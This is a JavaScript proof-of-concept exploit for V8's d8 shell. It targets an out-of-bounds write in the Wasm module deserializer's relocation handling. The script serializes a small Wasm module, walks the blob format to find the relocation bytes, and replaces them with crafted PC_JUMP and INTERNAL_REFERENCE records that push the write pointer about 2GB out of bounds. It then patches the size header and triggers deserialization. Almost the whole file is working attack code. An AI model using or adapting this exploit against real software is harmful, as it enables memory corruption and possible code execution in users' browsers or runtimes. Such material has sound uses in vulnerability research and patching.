'use strict';
// PoC: wasm-serialization.cc CopyAndRelocate reloc OOB write
// NativeModuleDeserializer::CopyAndRelocate - rinfo_.pc_ is unbounded
// PC_JUMP reloc record: rinfo_.pc_ += pc_jump << 6, no bounds check
// INTERNAL_REFERENCE: WriteUnalignedValue(rinfo_.pc_, target) with DCHECK_LT only
//
// Run: d8 --fuzzing --wasm-poc-bypass --no-liftoff poc_reloc_oob.js

function u8(b, o)  { return b[o]; }
function u32(b, o) { return (b[o] | (b[o+1]<<8) | (b[o+2]<<16) | (b[o+3]<<24)) >>> 0; }
function u64(b, o) { return BigInt(u32(b,o)) | (BigInt(u32(b,o+4)) << 32n); }
function wi32(b, o, v) {
  b[o]=(v&0xFF); b[o+1]=((v>>8)&0xFF); b[o+2]=((v>>16)&0xFF); b[o+3]=((v>>24)&0xFF);
}

// Minimal Wasm: () -> i32, body: i32.const 42
const wasm_bytes = new Uint8Array([
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
  0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
  0x03, 0x02, 0x01, 0x00,
  0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00,
  0x0a, 0x06, 0x01, 0x04, 0x00, 0x41, 0x2a, 0x0b,
]);

// Step 1: compile with TurboFan (requires --no-liftoff) and serialize
const mod = new WebAssembly.Module(wasm_bytes);
const inst = new WebAssembly.Instance(mod);
inst.exports.main();
const blob_ab = d8.wasm.serializeModule(mod);
const blob = new Uint8Array(blob_ab);
print(`[*] Serialized blob: ${blob.length} bytes`);
if (blob.length === 0) {
  print('[!] Empty blob - module not TurboFan compiled. Use --no-liftoff.');
  quit(1);
}

// Step 2: parse blob structure to find reloc_info bytes
// Outer header (from WriteHeader):
//   magic(4) + version_hash(4) + cpu_features(4) + flags_hash(4) + wasm_features(4) = 20
//   compile_import_flags (StorageType ~4) + constants_module_len(4) + bytes
let pos = 20;
const cmod_flags_size = 4;  // CompileTimeImportFlags::StorageType
pos += cmod_flags_size;
const cmod_len = u32(blob, pos); pos += 4;
pos += cmod_len;
print(`[*] After outer header: pos=${pos}`);

// Inner header (from NativeModuleSerializer::WriteHeader via ReadHeader):
//   detected_features (StorageType = uint64_t = 8 bytes)
//   remaining_code_size (size_t = 8 bytes)
//   well_known_imports (0 entries for no imports)
const inner_hdr_start = pos;
const detected_features = u64(blob, pos); pos += 8;
const remaining_code = u64(blob, pos); pos += 8;
print(`[*] detected_features=0x${detected_features.toString(16)}n`);
print(`[*] remaining_code_size=${remaining_code}`);

// Step 3: parse ReadCode for function 0
// code_kind (uint8): 0=lazy, 1=eager, other=compiled
const code_kind = u8(blob, pos);
print(`[*] code_kind=0x${code_kind.toString(16)} at pos=${pos}`);
if (code_kind === 0 || code_kind === 1) {
  print('[!] Function not TurboFan compiled. Use --no-liftoff flag.');
  quit(1);
}

const fn_start = pos;
pos += 1;

// 9 int32 offsets + 1 uint32 tagged_param + uint32 code_size + uint32 reloc_size
// + uint32 src_pos_size + uint32 inlining_pos_size + uint32 deopt_size
// + uint32 trap_size + uint32 eh_size + uint8 wasm_kind + uint8 exec_tier
const hdr_offset = pos;
// 8 int offsets + tagged_parameter_slots = 9 fields total (each 4 bytes)
// constant_pool, safepoint, handler, code_comments, jump_table_info,
// unpadded_binary, stack_slots, ool_spills, raw_tagged_parameter_slots
pos += 9*4;
const code_size_off = pos;
const code_size = u32(blob, pos); pos += 4;
const reloc_size_off = pos;
const reloc_size = u32(blob, pos); pos += 4;
const src_pos_size = u32(blob, pos); pos += 4;
const inline_pos_size = u32(blob, pos); pos += 4;
const deopt_size = u32(blob, pos); pos += 4;
const trap_size = u32(blob, pos); pos += 4;
const eh_size = u32(blob, pos); pos += 4;
const wasm_kind = u8(blob, pos); pos += 1;
const exec_tier = u8(blob, pos); pos += 1;

print(`[*] code_size=${code_size} reloc_size=${reloc_size}`);
print(`[*] wasm_kind=${wasm_kind} exec_tier=${exec_tier}`);

const code_start = pos;
const reloc_start = code_start + code_size;
const src_pos_start = reloc_start + reloc_size;

print(`[*] code at [${code_start}, ${reloc_start})`);
print(`[*] reloc at [${reloc_start}, ${src_pos_start})`);
const orig_reloc = blob.slice(reloc_start, src_pos_start);
print(`[*] orig reloc: ${Array.from(orig_reloc).map(x=>x.toString(16).padStart(2,'0')).join(' ')}`);

// Step 4: craft malicious reloc_info
// Goal: PC_JUMP to advance rinfo_.pc_ by ~128MB, then INTERNAL_REFERENCE at OOB addr
//
// Reloc buffer is read BACKWARD (from high addr to low addr) using --pos_.
// Memory layout (index 0=low, N-1=high):
//
// buf[N-1]: PC_JUMP mode byte = (23<<2)|3 = 0x5F  [read first by AdvanceGetTag]
// buf[N-2..N-4]: VLQ bytes for pc_jump=0x1FFFFF, in reader order (high to low):
//   reader reads: buf[N-2]=0xFF, buf[N-3]=0xFF, buf[N-4]=0x7F
//   VLQ decode: 0xFF(continue,bits=0x7F) + 0xFF(continue,bits|=0x7F<<7=0x3FFF) +
//               0x7F(stop, bits|=0x7F<<14=0x1FFFFF) = 0x1FFFFF
//   rinfo_.pc_ += 0x1FFFFF << 6 = 0x7FFFFFC0 ≈ 2GB OOB
// buf[N-5]: INTERNAL_REFERENCE mode byte = (12<<2)|3 = 0x33  [AdvanceGetTag → mode]
// buf[N-6]: small_pc_delta = 0x00  [AdvanceReadPC → no additional offset]

const PC_JUMP = 23;
const INREF   = 12;
const mk = m => ((m << 2) | 3);  // mode_byte with kDefaultTag

const malicious_reloc = new Uint8Array(6);
// High address end (reader reads these first):
malicious_reloc[5] = mk(PC_JUMP);  // 0x5F: PC_JUMP tag
malicious_reloc[4] = 0xFF;          // VLQ byte 1: continue, 7 bits = 0x7F
malicious_reloc[3] = 0xFF;          // VLQ byte 2: continue, 7 bits = 0x7F
malicious_reloc[2] = 0x7F;          // VLQ byte 3: stop,   7 bits = 0x7F → total = 0x1FFFFF
malicious_reloc[1] = mk(INREF);    // 0x33: INTERNAL_REFERENCE
malicious_reloc[0] = 0x00;          // small_pc_delta = 0
// Low address end

print(`[*] Malicious reloc: ${Array.from(malicious_reloc).map(x=>x.toString(16).padStart(2,'0')).join(' ')}`);
print(`[*] Expected OOB offset: 0x${(0x1FFFFF * 64).toString(16)} bytes from instruction_start`);

// Step 5: splice into blob
const new_blob = new Uint8Array(
  blob.length - reloc_size + malicious_reloc.length
);
// Copy everything before reloc bytes
new_blob.set(blob.slice(0, reloc_start), 0);
// Inject malicious reloc
new_blob.set(malicious_reloc, reloc_start);
// Copy everything after original reloc
new_blob.set(blob.slice(src_pos_start), reloc_start + malicious_reloc.length);

// Patch reloc_size field in header
wi32(new_blob, reloc_size_off, malicious_reloc.length);

print(`[*] New blob size: ${new_blob.length} bytes`);
print(`[*] reloc_size field patched at offset ${reloc_size_off}: ${malicious_reloc.length}`);

// Step 6: trigger deserialization (requires --wasm-poc-bypass to skip hash check)
print('[*] Triggering NativeModuleDeserializer::CopyAndRelocate with crafted reloc...');
print('[*] Expected: SIGSEGV/crash as WriteUnalignedValue hits OOB address');
print('[*] In release build: DCHECK_LT stripped → actual OOB write to arbitrary addr');

try {
  const result = d8.wasm.deserializeModule(new_blob.buffer, wasm_bytes);
  print(`[!!!] SURVIVED - module deserialized: ${result}`);
  print('[!!!] If running release build, OOB write may have silently corrupted memory.');
} catch(e) {
  if (e.toString().includes('manipulated')) {
    print('[!] Hash check blocked deserialization. Use --wasm-poc-bypass flag.');
  } else {
    print(`[*] Exception during deserialization: ${e}`);
    print('[*] INTERNAL_REFERENCE at OOB addr likely caused segfault caught as exception');
  }
}
